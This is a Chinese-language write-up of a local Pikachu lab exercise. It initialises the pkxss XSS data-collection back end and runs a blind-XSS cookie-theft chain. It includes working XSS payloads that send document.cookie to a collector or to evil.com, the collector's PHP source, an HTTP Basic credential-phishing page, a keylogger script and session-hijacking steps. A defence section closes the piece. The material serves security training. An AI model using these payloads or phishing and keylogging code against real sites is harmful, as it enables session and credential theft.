---
layout: post
title: Pikachu - 管理工具 XSS后台 Writeup（pkxss 初始化与 cookie 搜集链）
platform: pikachu
date: 2026-10-29 21:15:00 +0800
categories: CTF
---

Pikachu - 管理工具 XSS后台 Writeup（pkxss 初始化与 cookie 搜集链）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：管理工具 → XSS后台
- 地址：`http://localhost/pikachu/pkxss/`
- 题型：Web（工具 / 靶场环境）
- 考点：**XSS 数据接收后台**、盲打带外存储、cookie 搜集链

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
目录：D:\phpstudy_pro\WWW\pikachu\pkxss\
```

**目录结构**：

```
pkxss\
├── index.php                 入口（检查数据库，跳登录）
├── pkxss_login.php           登录页
├── pkxss_install.php         ★ 初始化安装脚本
├── xssmanager.php            后台首页（菜单）
├── inc\
│   ├── config.inc.php        数据库配置（DBNAME = pkxss）
│   └── mysql.inc.php         connect / escape / execute
├── xcookie\                  ★ cookie 搜集
│   ├── cookie.php            收集接口（?cookie=...）
│   └── pkxss_cookie_result.php  结果展示
├── xfish\                    ★ 钓鱼页（HTTP Basic）
│   ├── fish.php              伪造认证框
│   ├── xfish.php             收集接口
│   └── pkxss_fish_result.php 结果展示
└── rkeypress\                ★ 键盘记录
    ├── rk.js                 前端记录脚本
    ├── rkserver.php          收集接口
    └── pkxss_keypress_result.php  结果展示
```

---

# ⚠️ 打开就报错：`Unknown database 'pkxss'`

**★ 现象**：

```
Warning: mysqli_connect(): (HY000/1049): Unknown database 'pkxss'
         in D:\phpstudy_pro\WWW\pikachu\pkxss\index.php on line 10

欢迎使用 pikachu Xss 后台
```

**★ 原因**：

```
pikachu 的"XSS 后台（pkxss）"用的是【独立的一套数据库】
库名叫 pkxss

而 pikachu 主程序只创建了 pikachu 这一个库
→ pkxss 库从来没建过 → 连接就报"Unknown database"
```

**★ 确认一下**：

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| pikachu            |
| sys                |
+--------------------+
★ 确实没有 pkxss
```

二、题目分析

**① pkxss 是什么**

**★ 一句话**：

```
pkxss 是 pikachu 自带的"XSS 数据接收后台"
用来"接收并展示"XSS payload 偷到的东西：
    · cookie（xcookie）
    · 账号密码（xfish，钓鱼）
    · 键盘记录（rkeypress）
```

**★ 为什么要它？**

```
XSS 盲打（blind XSS）的场景：
    攻击者在留言板埋 payload
    管理员在【后台】查看留言时才触发
    攻击者【看不到】后台页面，拿不到回显
    
→ 所以需要一个"外部仓库"来存数据
→ 攻击者的 payload 把数据"发到 pkxss"
→ pkxss 存进数据库
→ 攻击者事后登录 pkxss 看结果
★ 这就是"带外存储"（Out-of-Band 的一种）
```

**② 初始化：`pkxss_install.php` 做了什么**

**★ 打开**：

```
http://localhost/pikachu/pkxss/pkxss_install.php
```

**★ 页面提示**：

```text
Setup guide:
第0步：请提前安装"mysql+php+中间件"的环境;
第1步：请根据实际环境修改pkxss/inc/config.inc.php文件里面的参数;
第2步：点击"安装/初始化"按钮;

[ 安装/初始化 ]
```

**★ 点按钮后，脚本做四件事**：

```php
// ① 删库（如果存在）
drop database if exists pkxss

// ② 建库
CREATE DATABASE pkxss

// ③ 建 4 张表
```

| 表名 | 字段 | 用途 |
|---|---|---|
| `users` | id, username, password, level | **后台账号**（默认 admin/123456）|
| `cookies` | id, time, ipaddress, cookie, referer, useragent | **偷到的 cookie** |
| `fish` | id, time, username, password, referer | 钓鱼得到的账号密码 |
| `keypress` | id, data | 键盘记录 |

```php
// ④ 插入默认管理员
insert into `users` (id,username,password,level) values (1,'admin',md5('123456'),1)
```

**★ 实测输出**（我在这台机器上跑过）：

```
数据库连接成功!
新建数据库表users成功!
新建数据库表cookie,fish成功!
好了，可以了 点击这里进入首页
```

**★ 验证**：

```sql
mysql> use pkxss; show tables;
+------------------+
| Tables_in_pkxss  |
+------------------+
| cookies          |
| fish             |
| keypress         |
| users            |
+------------------+

mysql> select id,username,password,level from users;
| 1 | admin | e10adc3949... | 1 |
★ password 是 md5('123456')
```

**③ ⭐ 一个"顺手"发现的 PHP 兼容性问题**

**★ 看 `index.php` 第 8-20 行**：

```php
try
{
    $link = mysqli_connect(DBHOST, DBUSER, DBPW, DBNAME);
}
catch(Exception $e)
{
    $html .=
        "<p>
        <a href='pkxss_install.php' style='color:red;'>
        提示:欢迎使用xss后台，点击进行初始化安装!
        </a>
    </p>";
}
```

**★ 作者的意图**：

```
连接失败 → 捕获异常 → 显示"点击初始化安装"的友好链接
```

**★ 但实际效果**：

```
你看到的是"裸的 Warning"，而不是那个友好链接
★ catch 块根本没执行
```

**★ 为什么？**

```
PHP 的 mysqli 扩展有三种"报错模式"（mysqli_report）：
    MYSQLI_REPORT_OFF    → 只发 Warning，不抛异常（PHP 默认）
    MYSQLI_REPORT_ERROR  → 抛异常（PHP 8.1 起默认）
    MYSQLI_REPORT_STRICT → 抛异常

★ PHP 7.3 默认是 MYSQLI_REPORT_OFF
→ 连接失败只产生 Warning
→ 不会抛 Exception → catch 不生效
→ 页面继续往下跑，最后显示"欢迎使用 pikachu Xss 后台"
```

**★ 这就是"老代码 + 新 PHP"的典型问题**：

```
作者写代码时可能用 PHP 5.x（mysqli 行为不同）
或者用了 mysqli_report(MYSQLI_REPORT_ERROR) 但没写进代码
→ 到了 PHP 7.3 上，"try/catch 优雅降级"就失效了
★ 结果：用户看到的是 Warning，不是"引导安装"
```

**★ 修复思路**（如果自己想改）：

```php
// 在 connect 之前加上
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);

// 或者改成"不用异常"的写法
$link = @mysqli_connect(DBHOST, DBUSER, DBPW, DBNAME);
if (!$link) {
    die("<a href='pkxss_install.php'>点击初始化安装</a>");
}
```

**④ ⭐ 三个子系统：xcookie / xfish / rkeypress**

**★ 子系统 1：`xcookie` —— cookie 搜集（最常用）**

**★ 收集接口**（`xcookie/cookie.php`）：

```php
<?php
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link = connect();

//这个是获取cookie的api页面
if(isset($_GET['cookie'])){
    $time      = date('Y-m-d g:i:s');
    $ipaddress = getenv('REMOTE_ADDR');
    $cookie    = $_GET['cookie'];
    $referer   = $_SERVER['HTTP_REFERER'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $query = "insert cookies(time,ipaddress,cookie,referer,useragent)
              values('$time','$ipaddress','$cookie','$referer','$useragent')";
    $result = mysqli_query($link, $query);
}
header("Location:http://192.168.1.4/pikachu/index.php");//重定向到一个可信的网站
?>
```

**★ 这个设计的巧妙之处**：

```
① 用 $_GET['cookie'] 接收数据（payload 里拼进去）
② 记录 IP / Referer / User-Agent（都是"证据"）
③ 最后 302 跳到一个"可信的网站"
   ★ 让受害者"看起来什么都没发生"
   ★ 如果跳到一个空白页/错误页，受害者会起疑
```

**★ 攻击者用的 payload**：

```html
<script>
    new Image().src =
        'http://localhost/pikachu/pkxss/xcookie/cookie.php?cookie=' +
        encodeURIComponent(document.cookie);
</script>
```

**★ 为什么用 `new Image()` 而不是 `location`？**

```
· new Image().src = ...  → 静默发请求，页面不跳转
· location = ...         → 页面会跳走，受害者立刻发现
★ 盲打要"隐蔽"，所以用 Image 对象
```

**★ 实测（我模拟受害者请求）**：

```
GET /pikachu/pkxss/xcookie/cookie.php?cookie=PHPSESSID=FAKE_SESSION_123; ant[uname]=admin...
→ HTTP 302  Location: http://192.168.1.4/pikachu/index.php
```

**★ 数据库里收到**：

```sql
mysql> select id,time,ipaddress,cookie from cookies;
| 1 | 2026-10-29 08:53:23 | ::1 | PHPSESSID=FAKE_SESSION_123; ant[uname]=admin; ant[pw]=1... |
★ cookie / IP / 时间 全记录下来了
```

**★ 子系统 2：`xfish` —— 钓鱼页（HTTP Basic 认证）**

**★ 看 `xfish/fish.php`**：

```php
<?php
error_reporting(0);
if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
    // 发送认证框，并给出迷惑性的info
    header('Content-type:text/html;charset=utf-8');
    header("WWW-Authenticate: Basic realm='认证'");
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authorization Required.';
    exit;
} else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))) {
    // 将结果发送给搜集信息的后台
    header("Location: http://192.168.1.15/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}");
}
?>
```

**★ 原理**：

```
① 访问 fish.php
→ 服务器返回 401 + WWW-Authenticate 头
→ 浏览器弹"HTTP Basic 认证框"（就是那种"请输入用户名密码"的原生弹窗）

② 受害者以为"这是后台在验证身份" → 输入账号密码
③ 浏览器把凭据发给 fish.php
→ PHP 从 $_SERVER['PHP_AUTH_USER'] / PHP_AUTH_PW 拿到
→ 302 跳到 xfish.php?username=...&password=...
→ 存进 fish 表

★ 这是"钓鱼"的一种：用"浏览器原生认证框"骗密码
★ 因为弹窗是浏览器原生的，受害者很难分辨真假
```

**★ 子系统 3：`rkeypress` —— 键盘记录**

```
rk.js       → 前端 JS：监听 keydown，把按键发到 rkserver.php
rkserver.php → 收集接口：存进 keypress 表
★ 典型 payload：
    <script src="http://localhost/pikachu/pkxss/rkeypress/rk.js"></script>
★ 效果：受害者在页面上的"每次按键"都被记录
★ 能用来记录"输入的密码"（如果他在同一个页面输入）
```

**⑤ ⚠️ 两个"硬编码 IP"的坑**

**★ 看这两行**：

```php
// xcookie/cookie.php 第 18 行
header("Location:http://192.168.1.4/pikachu/index.php");

// xfish/fish.php 第 13 行
header("Location: http://192.168.1.15/pkxss/xfish/xfish.php?username=...");
```

**★ 这两个 IP 是作者环境里的地址，你本机没有。**

**★ 影响**：

```
· cookie.php：cookie 已经存进数据库了，但"跳转"会失败（页面显示"无法访问"）
  ★ 不影响"收集"，只影响"伪装效果"
  
· fish.php：跳转失败 → 密码存不进去
  ★ 这个有影响！因为"存储"是靠"跳转到 xfish.php"完成的
```

**★ 怎么改（如果想完整跑通）**：

```php
// xcookie/cookie.php 第 18 行
header("Location:http://localhost/pikachu/index.php");

// xfish/fish.php 第 13 行
header("Location: http://localhost/pikachu/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}");
```

**★ 但这不是必须的**：

```
· cookie 收集不依赖跳转成功（insert 已经执行了）
· fish 钓鱼如果要完整跑通，必须改
★ 所以"xss 后台"这一页，主要用 xcookie 就够了
```

三、解题步骤

**第 1 步：初始化数据库**

```text
① 打开 http://localhost/pikachu/pkxss/pkxss_install.php
② 看到 "Setup guide" 三步说明
③ 点【安装/初始化】按钮
④ 看到：
   数据库连接成功!
   新建数据库表users成功!
   新建数据库表cookie,fish成功!
   好了，可以了 点击这里进入首页
```

**★ 如果没初始化就访问 `pkxss/index.php`**：

```
Warning: mysqli_connect(): (HY000/1049): Unknown database 'pkxss'
★ 就是这个报错
```

**第 2 步：登录后台**

```text
① 打开 http://localhost/pikachu/pkxss/
② 应该跳到 pkxss_login.php
③ 输入：admin / 123456
④ 登录成功 → xssmanager.php
```

**★ 实测**：

```
POST /pkxss/pkxss_login.php (admin/123456)
→ HTTP 302  Location: xssmanager.php  ✅
```

**第 3 步：看后台菜单**

**★ `xssmanager.php` 的菜单**：

```html
<h2 class="left_title">测试模块 | <a href="xssmanager.php?logout=1">退出登陆</a></h2>
<ul class="left_list">
    <li><a href="xcookie/pkxss_cookie_result.php">cookie搜集</a></li>
    <li><a href="xfish/pkxss_fish_result.php">钓鱼</a></li>
    <li><a href="rkeypress/pkxss_keypress_result.php">键盘记录</a></li>
</ul>
```

**★ 三个模块都能点进去看结果。**

**第 4 步：⭐ 跑一遍完整的"盲打 + cookie 搜集"链**

**★ 第 ① 步：在盲打靶场提交 payload**

```
打开 http://localhost/pikachu/vul/xss/xssblind/xss_blind.php
在留言框里填：

<script>new Image().src='http://localhost/pikachu/pkxss/xcookie/cookie.php?cookie='+encodeURIComponent(document.cookie)</script>

点提交
```

**★ 第 ② 步：管理员看留言（触发 payload）**

```
打开盲打靶场的"管理端"（通常是 xss_blind.php 的"查看留言"页面）
→ 页面加载时，你的 payload 被执行
→ 浏览器偷偷请求 cookie.php?cookie=<管理员的cookie>
→ cookie 写进 pkxss 库
```

**★ 第 ③ 步：登录 pkxss 后台看结果**

```
① http://localhost/pikachu/pkxss/ → admin/123456
② 点"cookie搜集"
③ 看到：
   id | time | ipaddress | cookie | referer | useragent
   1  | ...  | ::1       | PHPSESSID=...; ant[uname]=admin; ant[pw]=... | ... | ...
```

**★ 第 ④ 步：用偷到的 cookie 劫持会话**

```
① F12 → 应用程序 → Cookie
② 把 PHPSESSID 和 ant[uname] / ant[pw] 改成偷到的值
③ 刷新页面 → 你就是管理员了
★ 这就是"Pass-the-Cookie"（会话劫持）
```

**第 5 步：实测验证（我用脚本跑的）**

**★ 模拟"受害者浏览器执行 payload"**：

```python
import urllib.request, urllib.parse

# 受害者（管理员）的 cookie
victim_cookie = "PHPSESSID=FAKE_SESSION_123; ant[uname]=admin; ant[pw]=10470c3b..."

url = "http://localhost/pikachu/pkxss/xcookie/cookie.php?" + \
      urllib.parse.urlencode({"cookie": victim_cookie})

req = urllib.request.Request(url, headers={
    "User-Agent": "Mozilla/5.0 (Victim Browser)",
    "Referer": "http://localhost/pikachu/vul/xss/xssblind/xss_blind.php"
})
urllib.request.urlopen(req)   # 不跟随跳转
```

**★ 结果**：

```
HTTP 302  Location: http://192.168.1.4/pikachu/index.php
```

**★ 查数据库**：

```sql
mysql> use pkxss;
mysql> select id,time,ipaddress,cookie,useragent from cookies;

| 1 | 2026-10-29 08:53:23 | ::1 | PHPSESSID=FAKE_SESSION_123; ant[uname]=admin; ant[pw]=1... | Mozilla/5.0 (Victim Brows |
```

**★ 完整链路通了**：

```
受害者浏览器 → cookie.php?cookie=... → cookies 表 → 后台可见
```

四、延伸知识

**① 为什么盲打必须"带外存储"**

**★ 盲打（Blind XSS）的特点**：

```
· payload 在"管理员的后台"执行
· 攻击者看不到那个页面
· 所以"alert 弹窗"对攻击者没有任何用
★ 必须让数据"跑到攻击者能看到的地方"
```

**★ 三种"带外"方式**：

| 方式 | 例子 | 优点 | 缺点 |
|---|---|---|---|
| **自建接收端** | 本关的 pkxss | 数据完整、可管理 | 要有服务器 |
| **公有服务** | ntfy.sh / requestbin / webhook.site | 不用自己搭 | 数据过第三方 |
| **DNSLog** | dnslog.cn / ceye.io | 只需 DNS 就能确认 | 只能带"短数据" |

**★ 实际渗透里的选择**：

```
· 先确认"能外连"→ 用 DNSLog（最快、最隐蔽）
· 需要"传 cookie/页面内容"→ 用自建接收端（pkxss / XSS 平台）
★ 本关的 pkxss 就是"自建接收端"的教学版
```

**② `new Image()` 为什么要这样写**

**★ 三种发请求的方式**：

```javascript
// ① 会跳转（受害者会发现）
location = 'http://evil.com/?c=' + document.cookie;

// ② 静默（推荐）
new Image().src = 'http://evil.com/?c=' + document.cookie;
// ★ 创建图片对象，设置 src → 浏览器"以为要加载图片" → 发请求
// ★ 请求失败（404）无所谓，数据已经发出去了

// ③ 更现代（能拿响应）
fetch('http://evil.com/?c=' + document.cookie, {mode: 'no-cors'});
```

**★ 一个细节：`encodeURIComponent`**

```
document.cookie 里有空格、分号、等号
→ 直接拼进 URL 可能被截断/解析错
→ 要 encodeURIComponent 编码
★ 接收端（cookie.php）用 $_GET['cookie'] 拿到的就是原文
```

**★ 实测**：

```
不编码：?cookie=PHPSESSID=abc; ant[uname]=admin
        → $_GET['cookie'] = "PHPSESSID=abc"（分号后面被截断？实际上不会，但空格会变 +）

编码后：?cookie=PHPSESSID%3Dabc%3B%20ant%5Buname%5D%3Dadmin
        → $_GET['cookie'] = "PHPSESSID=abc; ant[uname]=admin" ✅
```

**③ `fish.php` 的 HTTP Basic 钓鱼**

**★ 原理**：

```
HTTP Basic 认证的流程：
① 客户端请求 → 服务器返回 401 + WWW-Authenticate: Basic realm="xxx"
② 浏览器弹原生认证框
③ 用户输入 → 浏览器把 base64(user:pass) 放进 Authorization 头
④ 服务器从 $_SERVER['PHP_AUTH_USER'] / PHP_AUTH_PW'] 读到
```

**★ `fish.php` 干的事**：

```php
if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header("WWW-Authenticate: Basic realm='认证'");
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authorization Required.';
    exit;      // ★ 第一次访问：只发 401，让浏览器弹框
}
// ★ 第二次访问（带凭据）：拿到密码 → 跳转存库
```

**★ 为什么这招"有效"？**

```
· 弹窗是【浏览器原生】的 → 受害者觉得"这是正经的认证"
· 域名还是"可信站点" → 更容易上当
· 输入后"页面跳转/正常显示" → 受害者以为"登录成功了"
★ 实际上密码已经被送走了
```

**★ 现实中更常见的是"仿冒登录页"**：

```
· 用 XSS 把页面替换成一个"登录框"
· 或者用"开放重定向"跳到钓鱼站
★ 原理一样：骗用户输入
```

**④ `rkeypress` 的键盘记录**

**★ `rk.js` 大概长这样**：

```javascript
document.onkeydown = function(e) {
    // 记录按键
    new Image().src = 'http://localhost/pikachu/pkxss/rkeypress/rkserver.php?data=' + e.key;
};
★ 每次按键 → 发一个请求 → 存进 keypress 表
```

**★ 危害**：

```
如果受害者在"同一个页面"里输入密码
→ 每次按键都被记录 → 密码被还原
★ 但实际中"密码框"通常在登录页，payload 在别的页面 → 记录不到
★ 所以这个模块更偏"演示"
```

**⑤ 防御（针对"XSS 后台"这类工具）**

**★ 注意**：本关是"攻击者用的工具"，防御的是"被它攻击"。

**✅ 针对 cookie 窃取**：

```php
// ① 关键 cookie 加 HttpOnly（JS 读不到）
setcookie('PHPSESSID', $id, ['httponly' => true, 'secure' => true, 'samesite' => 'Lax']);

// ② 不要用 cookie 存"身份哈希"（本环境 ant[pw] 就是反例）
//    改用 session（服务端存，客户端只有 session id）
```

**✅ 针对盲打本身**：

```
· 后台页面"输出用户内容"时做 HTML 转义（本环境没做 → 盲打成立）
· 加 CSP（限制外连）
· 后台用"独立域名"（cookie 隔离）
```

**✅ 针对钓鱼（fish.php 那种）**：

```
· 教育用户"看到浏览器原生认证框要警惕"
· 用 HTTPS + 证书（至少能确认域名对不对）
· 关键操作"二次验证"（即使密码泄露也进不去）
```

**⑥ 本关的"教学意义"**

**★ 它不是一道"漏洞题"，而是"工具使用题"**：

```
· 让你体验"攻击者视角"：数据在哪收、怎么管
· 让你理解"盲打为什么需要外部仓库"
· 让你看到"cookie 窃取"的完整落地过程
★ 这是"从会打 payload"到"会做完整攻击"的一步
```

**★ 一个实用的认知**：

```
渗透测试里，"能弹 alert"只是"证明漏洞存在"
"能拿到数据"才是"证明漏洞有价值"
★ pkxss 就是"从 alert 到拿数据"的那个环节
```

五、总结

- **本题核心：`pkxss` 是 pikachu 自带的 XSS 数据接收后台，需要先跑 `pkxss_install.php` 初始化数据库；初始化后用 `admin/123456` 登录，能看到 cookie / 钓鱼 / 键盘记录三类数据。**

- **关键发现（两个）**：

```text
① 报错 Unknown database 'pkxss'
   原因：pkxss 是独立数据库，pikachu 主库不含它
   修复：访问 pkxss_install.php → 点【安装/初始化】

② try/catch 没生效（没看到"点击初始化"的友好链接）
   原因：PHP 7.3 的 mysqli 默认只 Warning 不抛异常
   ★ 老代码 + 新 PHP 的典型问题
```

- **⭐ 八个必记要点**：

```text
① pkxss = XSS 数据接收后台（带外存储）
   三个子系统：xcookie / xfish / rkeypress

② 初始化：pkxss_install.php
   建 pkxss 库 + 4 张表 + 插入 admin/123456

③ 4 张表
   users（后台账号）
   cookies（偷到的 cookie）★ 最常用
   fish（钓鱼的账号密码）
   keypress（键盘记录）

④ cookie 收集链
   payload → xcookie/cookie.php?cookie=... → cookies 表 → 后台可见

⑤ payload 要"静默"
   new Image().src = '...?cookie=' + encodeURIComponent(document.cookie)
   ★ 用 location 会跳转，受害者会发现

⑥ cookie.php 最后会 302 跳转
   伪装成"正常访问"
   ★ 但硬编码了 192.168.1.4，本机需要改成 localhost

⑦ fish.php 用 HTTP Basic 认证钓鱼
   浏览器原生弹窗 + 可信域名 → 用户容易输入密码
   ★ 同样硬编码了 192.168.1.15

⑧ 防御：HttpOnly + CSP + 后台输出转义 + 独立域名
   ★ 核心是"别让 JS 拿到关键 cookie"
```

- **实测数据**：

```text
【初始化】
    数据库连接成功!
    新建数据库表users成功!
    新建数据库表cookie,fish成功!
    好了，可以了

【数据库】
    pkxss 库 4 张表：cookies / fish / keypress / users
    users: id=1, username=admin, password=md5('123456'), level=1

【登录】
    POST pkxss_login.php (admin/123456) → HTTP 302 → xssmanager.php  ✅

【cookie 收集】
    GET xcookie/cookie.php?cookie=PHPSESSID=FAKE_SESSION_123; ant[uname]=admin...
    → HTTP 302  Location: http://192.168.1.4/pikachu/index.php
    → cookies 表新增 1 条：
       id=1 | 2026-10-29 08:53:23 | ::1 | PHPSESSID=FAKE_SESSION_123; ant[uname]=admin; ant[pw]=1... | Mozilla/5.0 (Victim Brows
```

- **进度**：

```text
platform: pikachu   44 篇（本地 110 篇）

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
├── Unsafe Fileupload   3/7    （暂停，剩 4 关）
├── Over Permission     2/2    ✅
├── 目录遍历            1/1    ✅
├── 敏感信息泄露        1/1    ✅
├── PHP 反序列化        1/1    ✅
├── XXE                 1/1    ✅
├── URL 重定向          1/1    ✅
├── SSRF                2/2    ✅
└── 管理工具 XSS后台     1/1    ✅  ← 刚完成
```

**手工复现要点**：

```text
· 访问 pkxss/index.php → 看到 Unknown database 'pkxss'
· 访问 pkxss_install.php → 点【安装/初始化】→ 看到 4 行成功提示
· 访问 pkxss/ → admin / 123456 登录 → 看到三个菜单
· 手工请求 xcookie/cookie.php?cookie=test → 查 cookies 表有记录
· 点"cookie搜集" → 看到那条记录
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  pkxss = XSS 盲打的"数据仓库"                                  │
│                                                            │
│  报错 Unknown database 'pkxss'                              │
│      → 跑 pkxss_install.php 初始化                           │
│      → 建 4 张表：users / cookies / fish / keypress          │
│      → 默认账号 admin / 123456                               │
│                                                            │
│  完整链：                                                    │
│      留言板埋 payload                                        │
│          → 管理员看留言触发                                   │
│          → cookie.php?cookie=... 收数据                       │
│          → cookies 表 → 后台可见 → 劫持会话                    │
│                                                            │
│  ★ payload 用 new Image() 才静默（location 会跳转）            │
│  ★ cookie.php / fish.php 里有硬编码 IP，本机要改               │
│  ★ 从"弹 alert"到"拿到数据"，pkxss 就是那一步                  │
└────────────────────────────────────────────────────────────┘
```
